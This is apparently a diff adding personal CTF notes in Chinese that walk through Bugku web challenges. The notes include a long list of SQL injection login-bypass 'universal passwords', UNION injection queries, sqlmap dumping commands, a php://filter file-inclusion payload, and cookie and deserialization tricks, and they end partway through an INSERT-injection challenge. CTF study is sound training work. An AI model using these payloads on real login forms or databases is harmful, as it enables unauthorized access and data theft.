@@ -294,7 +294,7 @@
 				for (var i=0; i<4; i++)  // 没有相同元素，正常ASCII码
 					if (arr1[i+1] == arr1[i] || arr[i] < 0 || arr1[i+1] > 127)
 						ok = false;
-				arr2 = []
+				arr2 = [];
 				for (var i=0; i<4; i++)
 					arr2.push(arr1[i] + arr1[i+1]);
 				val = 0;
@@ -711,4 +711,297 @@
 	flag = base64.b64decode(flag.split(':')[1])  # 解码两次才变成数值
 	print(flag)
 	data = {'margin':flag}
-	print(req.post(url,data).content)
+	print(req.post(url,data).content)  # 此处为了看得方便可继续解码，不过没必要
+	
+	
+// 一定要养成手动保存的好习惯，东西丢了还是很伤心的，又要重写
+	
+	万能密码：
+		
+		-------asp万能密码----
+	 
+	      'or'='or'
+
+	 
+		--------aspx万能密码------
+	 
+	   1： "or "a"="a
+	   2： ')or('a'='a
+	   3：or 1=1--
+	   4：'or 1=1--
+	   5：a'or' 1=1--
+	   6： "or 1=1--
+	   7：'or'a'='a
+	   8： "or"="a'='a
+	   9：'or''='
+	   10：'or'='or'
+	   11: 1 or '1'='1'=1
+	   12: 1 or '1'='1' or 1=1
+	   13: 'OR 1=1%00
+	   14: "or 1=1%00
+	   15: 'xor
+	   16: 新型万能登陆密码
+
+	   用户名 ' UNION Select 1,1,1 FROM admin Where ''=' （替换表名admin）
+	   密码 1
+	   Username=-1%cf' union select 1,1,1 as password,1,1,1 %23
+	   Password=1
+
+	 
+	   17..admin' or 'a'='a 密码随便
+
+
+		--------PHP万能密码--------
+	 
+	   'or'='or'
+	  
+	   'or 1=1/*  字符型 GPC是否开都可以使用
+
+	 
+	   User: something
+	   Pass: ' OR '1'='1
+
+	 
+		--------jsp 万能密码------
+
+	   1'or'1'='1
+
+	   admin' OR 1=1/*
+	 
+	   用户名：admin    系统存在这个用户的时候 才用得上
+	   密码：1'or'1'='1
+
+
+# cookies欺骗
+	得到这么一个字符串：
+	rfrgrggggggoaihegfdiofi48ty598whrefeoiahfeiafehbaienvdivrbgtubgtrsgbvaerubaufibry
+	还有一个地址：index.php?line=& filename=a2V5cy50eHQ= (keys.txt)
+	直接查看keys.txt，发现还是这么一段乱七八糟的字符串
+	上面那个又向一个文件包含，filename传入的还是一个base64编码，看看 aW5kZXgucGhw (index.php)
+	乍一看还是什么都没有，调整一下line的参数，有点东西了，一点一点扒下来
+	<?php
+		error_reporting(0);
+		$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");
+		$line=isset($_GET['line'])?intval($_GET['line']):0;
+		if($file=='') header("location:index.php?line=&filename=a2V5cy50eHQ=");
+		$file_list = array('0' =>'keys.txt','1' =>'index.php',);
+		if(isset($_COOKIE['margin']) && $_COOKIE['margin']=='margin'){
+			$file_list[2]='keys.php';
+		}
+		if(in_array($file, $file_list)){
+			$fa = file($file);
+			echo $fa[$line];
+		}
+	?>
+	此时改一下 cookies，margin=margin，游戏结束
+
+	
+# flag在index里
+	http://123.206.87.240:8005/post/index.php?file=show.php
+	大佬说这是明显的文件包含漏洞，试试 php:\\filter 伪协议
+	既然说flag在index里，看一下index源码，?file=php://filter/read=convert.base64-encode/resource=index.php
+	PGh0bWw+DQogICAgPHRpdGxlPkJ1Z2t1LWN0ZjwvdGl0bGU+DQogICAgDQo8P3BocA0KCWVycm9yX3JlcG9ydGluZygwKTsNCglpZighJF9HRVRbZmlsZV0pe2VjaG8gJzxhIGhyZWY9Ii4vaW5kZXgucGhwP2ZpbGU9c2hvdy5waHAiPmNsaWNrIG1lPyBubzwvYT4nO30NCgkkZmlsZT0kX0dFVFsnZmlsZSddOw0KCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpew0KCQllY2hvICJPaCBubyEiOw0KCQlleGl0KCk7DQoJfQ0KCWluY2x1ZGUoJGZpbGUpOyANCi8vZmxhZzpmbGFne2VkdWxjbmlfZWxpZl9sYWNvbF9zaV9zaWh0fQ0KPz4NCjwvaHRtbD4NCg==
+	
+	解码一下
+	<html>
+    <title>Bugku-ctf</title>
+  
+	<?php
+		error_reporting(0);
+		if(!$_GET[file]){echo '<a href="./index.php?file=show.php">click me? no</a>';}
+		$file=$_GET['file'];
+		if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
+			echo "Oh no!";
+			exit();
+		}
+		include($file); 
+	//flag:flag{edulcni_elif_lacol_si_siht}
+	?>
+	</html>
+	
+	
+# 成绩单
+	发现一个用 post 传 id 的输入框，注入题
+	-1' union select 1,2,3,database()#
+	-1' union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()#
+	-1' union select 1,2,3,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x666c3467#  // 这里用16进制绕过一下
+	-1' union select 1,2,3,skctf_flag from fl4g#
+	
+	sqlmap 也能跑出来，牛
+		sqlmap -u URL --data="id=1"
+		[11:01:58] [INFO] the back-end DBMS is MySQL
+		back-end DBMS: MySQL >= 5.0.12
+		发现后台数据库是 mysql
+		
+		列举所有数据库
+		sqlmap -u URL --data="id=1" --dbs
+		available databases [2]:
+		[*] information_schema
+		[*] skctf_flag
+		
+		爆出所有表
+		sqlmap -u URL --data="id=1" -D skctf_flag --tables
+		Database: skctf_flag
+		[2 tables]
+		+------+
+		| fl4g |
+		| sc   |
+		+------+
+		
+		列出内容
+		sqlmap -u http://123.206.87.240:8002/chengjidan/index.php --data="id=1" -T fl4g --dump 
+		也可以选择全弄出来：sqlmap -u http://123.206.87.240:8002/chengjidan/index.php --data="id=1" -D skctf_flag --dump
+		Database: skctf_flag
+		Table: fl4g
+		[1 entry]
+		+---------------------------------+
+		| skctf_flag                      |
+		+---------------------------------+
+		| BUGKU{Sql_INJECT0N_4813drd8hz4} |
+		+---------------------------------+
+		
+# 备份是个好习惯
+	d41d8cd98f00b204e9800998ecf8427e
+	d41d8cd98f00b204e9800998ecf8427e
+	提示提到了备份，应该是备份文件源码泄漏一类的，用脚本跑下后台有没有源码 {工具在 F/CTF_tools/源码泄露}
+	得到 index.php.bak
+	<?php
+		include_once "flag.php";
+		ini_set("display_errors", 0);
+		$str = strstr($_SERVER['REQUEST_URI'], '?');
+		$str = substr($str,1);
+		$str = str_replace('key','',$str);
+		parse_str($str);
+		echo md5($key1);
+		echo md5($key2);
+		if(md5($key1) == md5($key2) && $key1 !== $key2){
+			echo $flag."取得flag";
+	}
+	有个替换性的过滤，用 kekeyy 就能绕过
+	分析源码，有个 parse_str()，此函数与 extract() 差不多，将关联数组中的元素与变量联系起来
+	那么就可以这样传值进去，kekeyy1 & kekeyy2[]
+	MD5函数无法处理数组，于是可以用 kekeyy1[]=33 & kekeyy2[]=44 进行绕过
+	或者直接 MD5碰撞
+?>
+
+# never give up
+	查看源码，发现一个小注释:1p.html
+	一打开就跳转到其他页面，拿burp抓一下，发现如下信息
+	
+	var Words ="%3Cscript%3Ewindow.location.href%3D%27http%3A//www.bugku.com%27%3B%3C/script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E" 
+	function OutWord() {
+		var NewWords;
+		NewWords = unescape(Words);
+		document.write(NewWords);
+	} 
+	OutWord();
+	然后一路解码，得到代码
+	<script>window.location.href='http://www.bugku.com';</script> 	
+	<!--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ==-->
+	
+	%22%3Bif%28%21%24_GET%5B%27id%27%5D%29%0A%7B%0A%09header%28%27Location%3A%20hello.php%3Fid%3D1%27%29%3B%0A%09exit%28%29%3B%0A%7D%0A%24id%3D%24_GET%5B%27id%27%5D%3B%0A%24a%3D%24_GET%5B%27a%27%5D%3B%0A%24b%3D%24_GET%5B%27b%27%5D%3B%0Aif%28stripos%28%24a%2C%27.%27%29%29%0A%7B%0A%09echo%20%27no%20no%20no%20no%20no%20no%20no%27%3B%0A%09return%20%3B%0A%7D%0A%24data%20%3D%20@file_get_contents%28%24a%2C%27r%27%29%3B%0Aif%28%24data%3D%3D%22bugku%20is%20a%20nice%20plateform%21%22%20and%20%24id%3D%3D0%20and%20strlen%28%24b%29%3E5%20and%20eregi%28%22111%22.substr%28%24b%2C0%2C1%29%2C%221114%22%29%20and%20substr%28%24b%2C0%2C1%29%21%3D4%29%0A%7B%0A%09require%28%22f4l2a3g.txt%22%29%3B%0A%7D%0Aelse%0A%7B%0A%09print%20%22never%20never%20never%20give%20up%20%21%21%21%22%3B%0A%7D%0A%0A%0A%3F%3E
+	
+	";if(!$_GET['id']) {
+		header('Location: hello.php?id=1');
+		exit();
+	}
+	$id=$_GET['id'];
+	$a=$_GET['a'];
+	$b=$_GET['b'];
+	if(stripos($a,'.'))	{
+		echo 'no no no no no no no';
+		return ;
+	}
+	$data = @file_get_contents($a,'r');
+	if($data=="bugku is a nice plateform!" and $id==0 and strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)
+		require("f4l2a3g.txt");
+	else
+		print "never never never give up !!!";
+	?>
+	既然是 require(f4l2a3g.txt) 直接看看这个文件？flag就直接能看到了
+
+	
+# 细心
+	出现一个假的404页面，源代码里面也啥都没有，尝试扫扫后台，发现robots.txt
+	打开它，发现一个 resusl.php 文件，再进去看一下，提示 _GET['x'] == password
+	提交 x = admin ，结果真中了，如果还没出来，只能想办法爆破了
+	
+	
+# flag.php
+	有个登录框，点 login 没反应，题名叫 flag.php，肯定有这个文件，进去看一下
+	啥都没有。上面提交之所以没反应，是因为 action=#，之前猜测直接给flag.php post 
+	user & password 的值，还是没卵用，试试post hint?，还是没用，最终看别人的解释是
+	在flagphp处get hint=1，直接出源码了？？还是要多尝试，反正就这么多套路
+	
+	 <?php
+		error_reporting(0);
+		include_once("flag.php");
+		$cookie = $_COOKIE['ISecer'];
+		if(isset($_GET['hint']))
+			show_source(__FILE__);
+		elseif (unserialize($cookie) === "$KEY") 
+			echo "$flag";
+		else {
+			?>
+			<html>
+			<head>
+			<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+			<title>Login</title>
+			<link rel="stylesheet" href="admin.css" type="text/css">
+			</head>
+			<body>
+			<br>
+			<div class="container" align="center">
+			  <form method="POST" action="#">
+				<p><input name="user" type="text" placeholder="Username"></p>
+				<p><input name="password" type="password" placeholder="Password"></p>
+				<p><input value="Login" type="button"/></p>
+			  </form>
+			</div>
+			</body>
+			</html>
+
+		<?php
+		}
+			$KEY='ISecer:www.isecer.com';
+		?> 
+		
+	打算直接提交ISecer = $KEY 的反序列化，后面发现在此之前$KEY都没有被定义，所以KEY是空的，
+	只需提交空的序列化上去就可以了
+		<?php
+			$cookie = serialize("$key");
+			print_r($cookie);
+		?>
+	这样构造一下，就得到了 s:0:"";
+	但是注意;(分号)在cookie中不会被正确的上传到服务器，构造URL编码
+	;的URL编码为%3B
+	所以 cookie:ISecer=s:0:""%3B
+	
+	
+# INSERT INTO注入
+	error_reporting(0);
+
+	function getIp(){
+		$ip = '';
+		if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])){
+			$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+		}else{
+			$ip = $_SERVER['REMOTE_ADDR'];
+		}
+		$ip_arr = explode(',', $ip);
+		return $ip_arr[0];
+	}
+
+	$host="localhost";
+	$user="";
+	$pass="";
+	$db="";
+
+	$connect = mysql_connect($host, $user, $pass) or die("Unable to connect");
+
+	mysql_select_db($db) or die("Unable to select database");
+
+	$ip = getIp();
+	echo 'your ip is :'.$ip;
+	$sql="insert into client_ip (ip) values ('$ip')";
+	mysql_query($sql);
